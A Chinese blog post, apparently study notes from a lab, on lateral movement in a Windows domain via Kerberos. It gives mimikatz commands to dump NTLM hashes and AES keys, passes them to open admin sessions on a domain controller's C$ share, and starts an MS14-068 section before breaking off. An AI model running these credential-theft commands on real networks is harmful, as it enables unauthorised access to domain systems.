{"title":"内网安全-域横向渗透【三】","uid":"f3c27b71dabaf6ecc45b5a407a397e09","slug":"内网安全-域横向渗透【三】","date":"2022-06-28T13:22:21.000Z","updated":"2022-06-29T12:17:00.942Z","comments":true,"path":"api/articles/内网安全-域横向渗透【三】.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>脑图：<br><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/%E4%BC%A0%E9%80%92-16564664836142.png\" alt=\"传递\"></p>\n<h2 id=\"0x01-Kerberos-协议\"><a href=\"#0x01-Kerberos-协议\" class=\"headerlink\" title=\"0x01 Kerberos 协议\"></a>0x01 Kerberos 协议</h2><p>###0x00 图解</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629091847090.png\" alt=\"image-20220629091847090\"></p>\n<h3 id=\"0x01-介绍\"><a href=\"#0x01-介绍\" class=\"headerlink\" title=\"0x01 介绍\"></a>0x01 介绍</h3><ul>\n<li><p>客户机将明文密码进行 NTLM 哈希,然后和时间戳一起加密(使用krbtgt 密码 hash 作为密钥)，发送给 kdc（域控），kdc 对用户进行检测，成功之后创建 TGT(Ticket-Granting Ticket)</p>\n</li>\n<li><p>将 TGT 进行加密签名返回给客户机器，只有域用户 krbtgt 才能读取 kerberos 中 TGT 数据</p>\n</li>\n<li><p>然后客户机将 TGT 发送给域控制器 KDC 请求 TGS（票证授权服务）票证，并且对 TGT 进行检测</p>\n</li>\n<li><p>检测成功之后，将目标服务账户的 NTLM 以及 TGT 进行加密，将加密后的结果返回给客户机</p>\n</li>\n</ul>\n<p>###0x02 利用PTH&amp;PTT&amp;PTK进行渗透测试</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>PTH(pass the hash) #利用 lm 或 ntlm 的值进行的渗透测试</p>\n<p>PTT(pass the ticket) #利用的票据凭证 TGT 进行的渗透测试</p>\n<p>PTK(pass the key) #利用的 ekeys aes256 进行的渗透测试</p></blockquote>\n<ul>\n<li><p>PTH 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和NTLM Hash访问远程主机或服务，而不用提供明文密码。</p>\n</li>\n<li><p>PTK：打了补丁才能用户都可以连接，采用 AES256 连接</p>\n</li>\n<li><p>PTT 攻击不是简单的 NTLM 认证了，它是利用 Kerberos 协议进行攻击。</p>\n</li>\n</ul>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>PTT常见的攻击方法：MS14-068，Golden ticket，SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接。</p>\n<p>MS14-068 基于漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)</p>\n<p>MS14-068 造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是KB3011780。</p></blockquote>\n<h2 id=\"0x02-PTH-NTML传递-Mimikatz\"><a href=\"#0x02-PTH-NTML传递-Mimikatz\" class=\"headerlink\" title=\"0x02 PTH-NTML传递-Mimikatz\"></a>0x02 PTH-NTML传递-Mimikatz</h2><h3 id=\"0x00-未打补丁下的工作组及域连接\"><a href=\"#0x00-未打补丁下的工作组及域连接\" class=\"headerlink\" title=\"0x00 未打补丁下的工作组及域连接\"></a>0x00 未打补丁下的工作组及域连接</h3><p>先使用mimikatz获取凭证信息NTML：<br><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629093835678.png\" alt=\"image-20220629093835678\"></p>\n<p>接着获取ekeys和aes1556：<br>执行：<code>mimikatz # sekurlsa::ekeys</code></p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629094628707.png\" alt=\"image-20220629094628707\"></p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629094500855.png\" alt=\"image-20220629094500855\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>获取到aes256：5e90d14b7bb44da0531c6d8e081c20dcecbc9969304ae0d5448a364163b5142f</p>\n<p>（PTK传递aes256）</p></blockquote>\n<h3 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p>先尝试访问DC主机c盘：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">dir \\\\192.168.3.21\\c$ 或者\ndir \\\\DC.test.com\\c$<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629102604255.png\" alt=\"image-20220629102604255\"></p>\n<p>可以看到找不到路径，是因为这时候使用本地用户登录，没有凭据。</p>\n<p>（假设已经拿到域控的hash）</p>\n<p>使用mimikatz执行命令：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">mimikatz # privilege::debug<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629103448781.png\" alt=\"image-20220629103448781\"></p>\n<p>出现报错；是因为本地用户权限不够，这也是为什么要提权的原因。</p>\n<p>使用管理员权限运行：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:test &#x2F;ntlm:9075168608b7aba2428c8387bfeb9aee #连接域内主机<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629101603978.png\" alt=\"image-20220629101603978\"></p>\n<p>会反弹一个cmd命令窗。</p>\n<p>执行：（必须要在弹出的cmd中执行，因为是管理员权限）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">dir \\\\192.168.3.21\\c$ 或者\ndir \\\\DC.test.com\\c$<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629101753943.png\" alt=\"image-20220629101753943\"></p>\n<p>可查看DC主机的c盘所有文件。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>这时候可以访问DC主机c盘是由于使用mimikatz传递了凭据，导致本地用户有了权限去访问DC主机。</p></blockquote>\n<h3 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h3><p>使用mimikatz获取到webserver主机的NTML后连接其工作组主机：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup &#x2F;ntlm:9075168608b7aba2428c8387bfeb9aee #连接工作组内主机<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>这里NTML值相同是因为DC主机和webserver主机密码相同。</p></blockquote>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629104820519.png\" alt=\"image-20220629104820519\"></p>\n<p>反弹cmd，这时候就能连接工作组内的主机（本地用户），由于环境原因，没有添加其他PC加入工作组；若添加用户后，则可以访问其PC主机。</p>\n<p>若命令中为<code>domain:test(域)</code>则是连接的域内用户。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>总结：</p>\n<ul>\n<li><p>通常渗透过程中，不能只单单渗透域内用户，也可以渗透本地用户；</p>\n</li>\n<li><p>如果禁用了 NTLM 认证，PsExec 无法利用获得的NTLM hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功。</p>\n</li>\n<li><p>对于 8.1&#x2F;2012R2，安装补丁 KB2871997 的 Win7&#x2F;2008R2&#x2F;8&#x2F;2012 等，可以使用 AES keys代替 NT hash 来实现 PTK 攻击；</p>\n</li>\n<li><p>KB2871997 补丁后的影响：</p>\n<ol>\n<li>PTH：没打补丁用户都可以连接，打了补丁只能 administrator 连接</li>\n<li>PTK：打了补丁才能用户都可以连接，采用 aes256 连接</li>\n</ol>\n</li>\n<li><p>参考文章：</p>\n</li>\n</ul>\n<p>​        <a href=\"https://www.freebuf.com/column/220740.html\">https://www.freebuf.com/column/220740.html</a></p></blockquote>\n<h2 id=\"0x03-PTK-AES256传递-mimikatz\"><a href=\"#0x03-PTK-AES256传递-mimikatz\" class=\"headerlink\" title=\"0x03 PTK-AES256传递-mimikatz\"></a>0x03 PTK-AES256传递-mimikatz</h2><h3 id=\"0x00-1\"><a href=\"#0x00-1\" class=\"headerlink\" title=\"0x00\"></a>0x00</h3><p><strong>注意：PTK攻击必须打补丁才能连接上去，不打补丁连接不上去。</strong></p>\n<h3 id=\"0x01-1\"><a href=\"#0x01-1\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p>mimikatz获取DC主机aes：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sekurlsa::ekeys #获取 aes<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629111631761.png\" alt=\"image-20220629111631761\"></p>\n<p>连接DC主机：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:test &#x2F;aes256:266bb6886f375743d72ae5369e58fc1939f4ec7016e8f259f0c16b28ea6d9bb6<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629112734677.png\" alt=\"image-20220629112734677\"></p>\n<p>反弹cmd命令窗。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>PTK攻击必须打补丁，不然不能使用aes连接。</p></blockquote>\n<p>##0x04  PTT 传递-MS14-068利用</p>\n<h3 id=\"0x00-2\"><a href=\"#0x00-2\" class=\"headerlink\" title=\"0x00\"></a>0x00</h3><p>能实现普通用户直接获取域控 system 权限。</p>\n<h3 id=\"0x01-2\"><a href=\"#0x01-2\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p><strong>1、首先查看当前sid（域用户）</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">whoami&#x2F;user<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629174344320.png\" alt=\"image-20220629174344320\"></p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%B8%89%E3%80%91.htm/image-20220629174527577.png\" alt=\"image-20220629174527577\"></p>\n<p><strong>2、执行MS14-068：</strong></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 